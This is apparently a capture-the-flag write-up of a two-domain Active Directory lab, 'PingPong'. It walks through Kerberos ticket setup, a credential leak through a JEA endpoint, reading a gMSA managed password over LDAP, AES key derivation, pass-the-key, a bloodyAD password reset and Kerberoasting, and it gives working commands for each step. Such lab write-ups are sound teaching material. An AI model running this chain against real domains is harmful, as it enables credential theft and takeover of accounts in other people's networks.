01 - Environment & Scope

Environment & Scope

PingPong involved two AD domains, PING.HTB and PONG.HTB. The interesting part was not a public exploit. It was Kerberos plumbing: tickets, ccache files, cross-domain names, salts, and how a gMSA secret becomes usable only when the key derivation is correct.

02 - Initial Access

Initial Credential & Kerberos Setup

What pointed us here The initial credential was for PING.HTB, but the interesting objects were in PONG.HTB. That means Kerberos configuration mattered. A wrong realm, wrong salt, or wrong ccache file gives the same external symptom: pre-auth failure or no usable ticket. 
# Hostname mapping used during the work
sudo tee -a /etc/hosts <<EOF
10.129.37.173 dc1.ping.htb ping.htb
127.0.0.2    dc2.pong.htb pong.htb
EOF

# Get the initial PING ticket
impacket-getTGT \
    'PING.HTB/c.roberts:AssumedBreach123' \
    -dc-ip 10.129.37.173

export KRB5CCNAME=c.roberts.ccache

The operational detail here is simple: keep every identity in its own ccache file. During this box we used files like c.roberts.ccache, ccarlssen.ccache, Pong_gMSA$.ccache, rmartin.ccache, and administrator.ccache. Mixing them is how you lose an hour debugging the wrong ticket.

03 - Trust / Cross-Realm

Cross-Domain Access Notes

What pointed us here The box name itself hinted at two realms. The target behavior confirmed it: work started in PING.HTB, then useful access landed in PONG.HTB. That makes referral tickets, DNS names, and realm casing part of the exploit chain.

In a normal single-domain box, you can often get away with sloppy Kerberos setup. Not here. The commands had to reference the correct FQDN, the correct realm, and the correct KDC. When a request crossed from PING to PONG, the ticket path had to make sense to the KDCs.

# Sanity checks before blaming the tool
klist -A
kvno cifs/dc1.ping.htb
kvno cifs/dc2.pong.htb

# Useful mental model
identity realm  = where the user account lives
service realm   = where the SPN is registered
target hostname = what the service ticket is for
04 - JEA Pivot

JEA / PSRP Credential Leak

What pointed us here JEA restrictions were present, but the interesting part was not bypass for the sake of bypass. The restricted endpoint exposed a path to a stronger PONG credential: PONG\c.carlssen with password REDACTED_PONG_PASSWORD.

JEA is supposed to limit what a user can run. The mistake is treating a restricted shell as a dead end. In practice, every allowed command is a small interface to the host. If the wrapper leaks arguments, runs scripts too broadly, or exposes stored credentials, the JEA boundary becomes an enumeration surface.

# PSRP-style access pattern used during the investigation
python3 - <<'PY'
from pypsrp.client import Client

c = Client(
    "dc2.pong.htb",
    username="PING.HTB\\c.roberts",
    password="AssumedBreach123",
    ssl=False,
    auth="kerberos"
)

print(c.execute_ps("whoami"))
PY

Recovered credential: PONG\c.carlssen / REDACTED_PONG_PASSWORD

The value of c.carlssen was not local execution. The value was LDAP access in the right domain, with enough rights to touch the gMSA path.

05 - gMSA Extraction

gMSA Password Extraction

What pointed us here The account Pong_gMSA$ existed, with DNS hostnames seen as pong_gmsa.pong.htb and gmsa.pong.htb during the work. gMSA accounts store their current password in msDS-ManagedPassword. The question was whether our PONG identity could read it. 
# Get a Kerberos ticket for c.carlssen
impacket-getTGT \
    'PONG.HTB/c.carlssen:REDACTED_PONG_PASSWORD' \
    -dc-ip 127.0.0.2

export KRB5CCNAME=ccarlssen.ccache

# Read the gMSA managed password blob over LDAP with GSSAPI
ldapsearch -Y GSSAPI \
    -H ldap://dc2.pong.htb \
    -b "CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb" \
    msDS-ManagedPassword dNSHostName

The raw value is not a normal password string. It is an MSDS-MANAGEDPASSWORD_BLOB. You parse it, extract the current password bytes, then derive the secrets you need.

06 - Key Material

NTLM and AES Key Derivation

What pointed us here We had the gMSA blob, but Kerberos still failed until the key derivation matched the account's real salt. This was the main trap: extracting a blob is easy, deriving the usable AES key is where mistakes show up. 
# Parsed values from the gMSA blob
Pong_gMSA$ NTLM  = REDACTED_GMSA_NTLM_HASH
Kerberos salt    = PONG.HTBhostpong_gmsa.pong.htb

# Working AES256 key
Pong_gMSA$ AES256 = REDACTED_GMSA_AES256_KEY

# One computed alternative did not work
	wrong AES256 prefix = REDACTED_WRONG_AES_PREFIX...

The failed AES value was useful because it proved the problem was not the account or the KDC. It was the derivation input. For gMSA accounts, the salt is tied to the realm and host form. A small hostname difference changes the AES key completely.

07 - gMSA Ticket

Using the gMSA Ticket

Once the AES256 key was correct, Kerberos accepted it. That gave us a real TGT as Pong_gMSA$. From there, the gMSA identity could be used for LDAP or AD operations without needing its plaintext password. 

# Request a TGT using the working AES key
impacket-getTGT \
    -aesKey REDACTED_GMSA_AES256_KEY \
    -dc-ip 127.0.0.2 \
    'PONG.HTB/Pong_gMSA$'

export KRB5CCNAME='Pong_gMSA$.ccache'

# Verify the ticket before continuing
klist

Default principal: Pong_gMSA$@PONG.HTB
08 - Escalation Notes

Password Reset and svc_sql Signal

What pointed us here With the gMSA ticket working, AD writes became the next thing to test. The validated trace shows R.Martinelli reset to REDACTED_RESET_PASSWORD and the service account svc_sql owning mssqlsvc/dc2.pong.htb. 
# Password reset performed during the chain
bloodyAD \
    -d pong.htb \
    --host dc2.pong.htb \
    -k \
    set password 'R.Martinelli' 'REDACTED_RESET_PASSWORD'

# SPN signal worth following
impacket-GetUserSPNs \
    -k -no-pass \
    -dc-ip 127.0.0.2 \
    PONG.HTB/ \
    -request

svc_sql / mssqlsvc/dc2.pong.htb

Chaîne validée jusqu'à l'extraction gMSA, la clé AES fonctionnelle, l'authentification Kerberos Pong_gMSA$ et le reset de R.Martinelli. Root en cours de finalisation.

10 - Lessons

Key Takeaways

Concept Lesson
ccache hygiene Use one ccache per identity. Cross-domain Kerberos work becomes unreadable fast if tickets are mixed.
JEA A restricted endpoint is not automatically safe. Treat allowed commands and their wrappers as a small exposed API to the host.
gMSA extraction msDS-ManagedPassword is LDAP data guarded by ACLs. Once an account can read it, the gMSA is effectively compromised.
AES keys For Kerberos, the extracted password bytes are not enough. AES keys depend on the correct realm and salt. A wrong hostname form creates a valid-looking key that fails.
Machine and service accounts Do not stop at user accounts. gMSAs and SPN-bearing service accounts often define the real privilege path.
